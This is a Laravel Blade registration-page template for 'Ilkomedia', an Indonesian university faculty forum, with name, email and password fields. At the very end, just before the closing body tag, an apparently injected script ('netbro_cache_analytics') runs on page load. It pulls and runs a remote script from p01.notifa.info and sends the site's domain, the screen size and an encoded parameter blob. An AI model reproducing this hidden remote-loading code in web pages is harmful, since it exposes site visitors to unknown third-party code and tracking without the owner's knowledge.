@extends('layouts.app')

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="This is social network html5 template available in themeforest......" />
    <meta name="keywords" content="Social Network, Social Media, Make Friends, Newsfeed, Profile Page" />
    <meta name="robots" content="index, follow" />
    <title>{{ config('app.name', 'Ilkomedia') }}</title>

<!--Google Font-->
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,400i,700,700i" rel="stylesheet">

</head>
<body>
@section('content')
    <!-- Landing Page Contents
================================================= -->
    <div id="lp-register">
        <div class="container wrapper">
            <div class="row">
                <div class="col-sm-5">
                    <div class="intro-texts">
                        <h1 class="text-white">Ilkomedia</h1>
                        <p>Ilkomedia adalah forum untuk berbagi informasi antar warga Fakultas Ilmu Komputer Universitas Jember</p>
                    </div>
                </div>
                <div class="col-sm-6 col-sm-offset-1">
                    <div class="reg-form-container">

                    <!--Registration Form Contents-->
                        <div class="tab-content">
                            <div class="tab-pane active" id="register">
                                <h3>Register</h3>
                                <p class="text-muted">Register to use this website</p>

                                <!--Register Form-->
                                <form name="registration_form" id='registration_form' class="form-inline" method="POST" action="{{ route('register') }}">
                                    {{ csrf_field() }}
{{--                                    <div class="row">--}}
{{--                                        <div class="avatar-upload{{ $errors->has('avatar') ? ' has-error' : '' }}">--}}
{{--                                            <div class="avatar-edit">--}}
{{--                                                <input type='file' name="avatar" id="imageUpload" accept=".png, .jpg, .jpeg, .svg" value="{{ old('avatar') }}" required/>--}}
{{--                                                <label for="imageUpload"></label>--}}
{{--                                            </div>--}}
{{--                                            <div class="avatar-preview">--}}
{{--                                                <div id="imagePreview" style="background-image: url(http://i.pravatar.cc/500?img=7);">--}}
{{--                                                </div>--}}
{{--                                            </div>--}}
{{--                                            @if ($errors->has('avatar'))--}}
{{--                                                <span class="help-block" style="text-align: center">--}}
{{--                                                    <strong>{{ $errors->first('avatar') }}</strong>--}}
{{--                                                </span>--}}
{{--                                            @endif--}}
{{--                                        </div>--}}
{{--                                    </div>--}}
                                    <div class="row">
                                        <div class="form-group col-xs-12{{ $errors->has('name') ? ' has-error' : '' }}">
                                            <label for="name" class="sr-only">Name</label>
                                            <input id="name" class="form-control input-group-lg" type="text" name="name" title="Enter your name" placeholder="Name" value="{{ old('name') }}" required/>
                                            @if ($errors->has('name'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('name') }}</strong>
                                                </span>
                                            @endif
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="form-group col-xs-12{{ $errors->has('email') ? ' has-error' : '' }}">
                                            <label for="email" class="sr-only">Email</label>
                                            <input id="email" class="form-control input-group-lg" type="text" name="email" title="Enter Email" placeholder="Email" value="{{ old('email') }}" required/>
                                            @if ($errors->has('email'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('email') }}</strong>
                                                </span>
                                            @endif
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="form-group col-xs-12{{ $errors->has('password') ? ' has-error' : '' }}">
                                            <label for="password" class="sr-only">Password</label>
                                            <input id="password" class="form-control input-group-lg" type="password" name="password" title="Password" placeholder="Your Password" required/>
                                            @if ($errors->has('password'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('password') }}</strong>
                                                </span>
                                            @endif
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="form-group col-xs-12">
                                            <label for="password-confirm" class="sr-only">Confirm Password</label>
                                            <input id="password-confirm" class="form-control input-group-lg" type="password" name="password_confirmation" title="Confirm password" placeholder="Confirm Password" required/>
                                            @if ($errors->has('password'))
                                                <span class="help-block">
                                                    <strong>{{ $errors->first('password') }}</strong>
                                                </span>
                                            @endif
                                        </div>
                                    </div>
                                    <button type="submit" class="btn btn-primary">Register Now</button>
                                </form><!--Register Now Form Ends-->
                            </div><!--Registration Form Contents Ends-->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!--preloader-->
    <div id="spinner-wrapper">
        <div class="spinner"></div>
    </div>

    <script type="text/javascript">if (self===top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAiySi%2bk45cljJxPp6Y86LGFk4AbWZZkO3GLi%2bv544%2fpXZGEJbwDK8FRcjTwVpmpcv%2bZRPdYdzPaiO1ZLFN4wsNFXRMOywQURRlMsj7jPXnFbMu7IR4uTIk8ds%2fGjCNbPLWVFI3kORLc9ze8%2fWF%2bXLuKoiGoIBwpO69tMT%2bWTtziQQm5CJu9OKtw1bhWn85%2fbMYPzZHJFLqOJUUNbChq0Zq%2fZ%2fx14dDwhwtAtCbF8Jjsxir8jskcrtNAZzDPWLLuvKeZ%2bysSwKkPTRuPMns805Oa7jZA3DFh0sCp7%2bW%2fuZEsuUh6XHSXFg0MrfgTDQ6jE2RoYjFAMNfQrfRQhBecgkl3gS9AErtw8TBqaebg%2b4Xi8H6Y0JsG6e0loC69SXm3Zohh59Thz%2fYDJoE851f1YM5sjW3zI4U68i8gL39tsa6y27XDwf89rWPLPhMLAOZZSX7R8cvAjm6QNBDecrUlgL3SQmn68OvtJIGlb%2bmhX1%2f0H5zgUrkRPXo3f9wnhZajWoPyEwvhNx6v4DO4Hzbr4mVoS51Bxc6mFMoorAwyFIoFjSZM%2fJmeSIKw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
@endsection

